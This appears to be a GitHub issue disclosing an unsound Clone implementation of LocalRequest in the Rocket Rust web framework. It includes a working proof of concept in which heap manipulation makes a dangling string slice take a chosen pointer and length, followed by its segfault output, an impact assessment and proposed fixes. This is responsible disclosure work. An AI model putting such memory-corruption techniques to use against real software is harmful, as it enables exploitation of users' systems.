{"url":"https://api.github.com/repos/rwf2/Rocket/issues/1312","repository_url":"https://api.github.com/repos/rwf2/Rocket","labels_url":"https://api.github.com/repos/rwf2/Rocket/issues/1312/labels{/name}","comments_url":"https://api.github.com/repos/rwf2/Rocket/issues/1312/comments","events_url":"https://api.github.com/repos/rwf2/Rocket/issues/1312/events","html_url":"https://github.com/rwf2/Rocket/issues/1312","id":625397880,"node_id":"MDU6SXNzdWU2MjUzOTc4ODA=","number":1312,"title":"Clone implementation for LocalRequest is unsound","user":{"login":"Qwaz","id":5073807,"node_id":"MDQ6VXNlcjUwNzM4MDc=","avatar_url":"https://avatars.githubusercontent.com/u/5073807?v=4","gravatar_id":"","url":"https://api.github.com/users/Qwaz","html_url":"https://github.com/Qwaz","followers_url":"https://api.github.com/users/Qwaz/followers","following_url":"https://api.github.com/users/Qwaz/following{/other_user}","gists_url":"https://api.github.com/users/Qwaz/gists{/gist_id}","starred_url":"https://api.github.com/users/Qwaz/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Qwaz/subscriptions","organizations_url":"https://api.github.com/users/Qwaz/orgs","repos_url":"https://api.github.com/users/Qwaz/repos","events_url":"https://api.github.com/users/Qwaz/events{/privacy}","received_events_url":"https://api.github.com/users/Qwaz/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":343542064,"node_id":"MDU6TGFiZWwzNDM1NDIwNjQ=","url":"https://api.github.com/repos/rwf2/Rocket/labels/bug","name":"bug","color":"B60205","default":true,"description":"Deviation from the specification or expected behavior"}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":1,"created_at":"2020-05-27T05:48:51Z","updated_at":"2020-05-27T08:32:35Z","closed_at":"2020-05-27T08:13:51Z","author_association":"NONE","type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## The Bug\r\nLocalRequest is one of a few places that Rocket uses unsafe Rust. While auditing the code, I found that its Clone implementation is unsound.\r\n\r\nFirst, let's look at the definition of LocalRequest, which implements a mutable Rc with a raw pointer:\r\nhttps://github.com/SergioBenitez/Rocket/blob/ca4d1572d408fd8dd13db103926ad96da878126d/core/lib/src/local/request.rs#L68-L100\r\n\r\nThe comment justifies that it is safe to have LocalRequest and LocalResponse which share the same Request pointer because modification from LocalRequest is not observable from LocalResponse. However, LocalRequest's Clone implementation allows to create two LocalRequest that share the same Request raw pointer, which was not part of the justification:\r\nhttps://github.com/SergioBenitez/Rocket/blob/ca4d1572d408fd8dd13db103926ad96da878126d/core/lib/src/local/request.rs#L477-L487\r\n\r\nThis ultimately permits the violation of aliasing rule with two LocalRequest instances that point to the same Request instance.\r\n\r\n## Proof of Concept\r\nPoC code:\r\n```rust\r\nuse rocket::http::Header;\r\nuse rocket::local::Client;\r\nuse rocket::Request;\r\n\r\nfn main() {\r\n    let client = Client::new(rocket::ignite()).unwrap();\r\n\r\n    // creates two LocalRequest instances that share the same Request pointer\r\n    let request1 = client.get(\"/\").header(Header::new(\"key\", \"val1\"));\r\n    let request2 = request1.clone();\r\n\r\n    // sanity check\r\n    assert_eq!(\r\n        request1.inner() as *const Request<'_>,\r\n        request2.inner() as *const Request<'_>\r\n    );\r\n\r\n    // save the iterator, which internally holds a slice\r\n    let mut iter = request1.inner().headers().get(\"key\");\r\n\r\n    // insert headers to reallocate the header map\r\n    request2\r\n        .header(Header::new(\"1\", \"v1\"))\r\n        .header(Header::new(\"2\", \"v2\"))\r\n        .header(Header::new(\"3\", \"v3\"))\r\n        .header(Header::new(\"4\", \"v4\"))\r\n        .header(Header::new(\"5\", \"v5\"))\r\n        .header(Header::new(\"6\", \"v6\"))\r\n        .header(Header::new(\"key\", \"val2\"));\r\n\r\n    // heap massage\r\n    let _: Vec<usize> = vec![0, 0xcafebabe, 31337, 0];\r\n\r\n    // iter is dangling now!\r\n    let s = iter.next().unwrap();\r\n\r\n    // address and length controlled\r\n    dbg!(s.as_ptr());\r\n    dbg!(s.len());\r\n\r\n    // segfaults\r\n    println!(\"{}\", s);\r\n}\r\n```\r\n\r\nOutput:\r\n```\r\n   Compiling rocket-unsound v0.1.0 (/home/yechan/rust/rocket-unsound)\r\n    Finished dev [unoptimized + debuginfo] target(s) in 1.33s\r\n     Running `target/debug/rocket-unsound`\r\nðŸ”§ Configured for development.\r\n    => address: localhost\r\n    => port: 8000\r\n    => log: normal\r\n    => workers: 32\r\n    => secret key: generated\r\n    => limits: forms = 32KiB\r\n    => keep-alive: 5s\r\n    => tls: disabled\r\n[src/main.rs:38] s.as_ptr() = 0x00000000cafebabe\r\n[src/main.rs:39] s.len() = 31337\r\nzsh: segmentation fault (core dumped)  cargo run\r\n```\r\n\r\nThe PoC was tested on the following environment:\r\n- Rocket: v0.4.4 (latest at the time of writing)\r\n- OS: Ubuntu 18.04.4 LTS\r\n- Rust: rustc 1.45.0-nightly (a74d1862d 2020-05-14)\r\n- Target: x86_64-unknown-linux-gnu\r\n\r\nThe PoC used a classic iterator invalidation to show it is possible to overwrite the pointer and the length of a string slice.\r\n\r\n## Is this a security bug?\r\nConsidering that\r\n1. LocalRequest is intended to be used for testing\r\n2. The exact pattern to trigger the bug is unlikely to happen in the wild\r\n\r\nI believe the security impact of this bug is minimal. I think It is still worthwhile to file a RustSec advisory after the bug confirmation [considering the people who want to be notified about unsound APIs](https://www.reddit.com/r/rust/comments/gidtpe/security_advisories_for_april_2020_rustqlite_os/).\r\n\r\n## Possible Fixes\r\nI believe LocalRequest can be redesigned without breaking LocalRequest API with safe alternatives such as [get_mut()](https://doc.rust-lang.org/std/rc/struct.Rc.html#method.get_mut) or [make_mut()](https://doc.rust-lang.org/std/rc/struct.Rc.html#method.make_mut).\r\n\r\nI think it is also possible to fix Clone to clone the internal Request, but the first solution which reduces the number of unsafe code should be preferred if possible.","closed_by":{"login":"SergioBenitez","id":1480321,"node_id":"MDQ6VXNlcjE0ODAzMjE=","avatar_url":"https://avatars.githubusercontent.com/u/1480321?v=4","gravatar_id":"","url":"https://api.github.com/users/SergioBenitez","html_url":"https://github.com/SergioBenitez","followers_url":"https://api.github.com/users/SergioBenitez/followers","following_url":"https://api.github.com/users/SergioBenitez/following{/other_user}","gists_url":"https://api.github.com/users/SergioBenitez/gists{/gist_id}","starred_url":"https://api.github.com/users/SergioBenitez/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/SergioBenitez/subscriptions","organizations_url":"https://api.github.com/users/SergioBenitez/orgs","repos_url":"https://api.github.com/users/SergioBenitez/repos","events_url":"https://api.github.com/users/SergioBenitez/events{/privacy}","received_events_url":"https://api.github.com/users/SergioBenitez/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/rwf2/Rocket/issues/1312/reactions","total_count":5,"+1":5,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/rwf2/Rocket/issues/1312/timeline","performed_via_github_app":null,"state_reason":"completed"}